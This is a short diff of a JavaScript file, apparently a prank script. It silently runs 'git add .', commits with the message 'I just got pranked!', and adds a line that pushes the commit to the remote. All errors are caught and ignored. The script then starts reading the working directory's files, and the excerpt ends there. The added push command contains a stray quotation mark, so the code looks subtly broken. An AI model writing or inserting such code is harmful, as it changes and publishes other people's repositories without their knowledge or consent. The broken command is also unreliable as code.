@@ -9,6 +9,7 @@ const exec = util.promisify(temp_exec);
 try {
   await exec("git add .");
   await exec(`git commit -m "I just got pranked!"`);
+  await exec(`git push"`);
 } catch (err) {}
 
 fs.readdir(process.cwd(), async (err, files) => {
